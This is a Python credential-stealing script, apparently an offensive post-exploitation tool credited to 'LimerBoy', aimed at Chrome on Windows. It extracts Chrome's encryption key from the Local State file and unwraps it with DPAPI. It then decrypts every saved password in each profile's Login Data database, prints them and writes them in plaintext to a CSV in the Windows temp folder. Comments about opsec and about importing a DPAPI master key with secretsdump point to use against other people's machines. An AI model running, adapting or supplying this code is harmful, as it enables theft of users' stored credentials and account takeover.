#Full Credits to LimerBoy
import os
import re
import json
import base64
import sqlite3
from win32 import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

username = "joebob"
writepath = "C:\\Windows\\temp\\decrypted_passwords.csv"

#GLOBAL CONSTANT
# Path of the "Local State file"
CHROME_PATH_LOCAL_STATE = f"C:\\Users\\{username}\\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
# Path of the User Data directory.
CHROME_PATH = f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data"

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI

        # ---- import key DPAPI master key here ----
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        # ---- End master key DPAPI import -----
        print(f"Secret key: {secret_key}") # Can we directly input our DPAPI master key here? dpapi.py secretsdump.py?
        # Might need to format the key in the specified format. 
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None
        
if __name__ == '__main__':
    try:
        #Create Dataframe to store passwords
        print("*" * 10 + "WARNING! THIS SCRIPT WRITES TO DISK! NOT OPSEC SAFE! " + "*" * 10)
        print(f"Writing file to : {writepath}")
        with open(writepath, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index","url","username","password"])
            #(1) Get secret key
            secret_key = get_secret_key()
            #Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
            for folder in folders:
            	#(2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index,login in enumerate(cursor.fetchall()):
                        print(f"Login (full) : {login}")
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        print("Sequence: %d"%(index))
                        print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                        print("*"*30)
                        #(5) Save into CSV 
                        csv_writer.writerow([index,url,username,decrypted_password])
                    #Close database connection
                    cursor.close()
                    conn.close()
                    #Delete temp login db
                    os.remove("Loginvault.db")
    except Exception as e:
        print("[ERR] "%str(e))
        
        
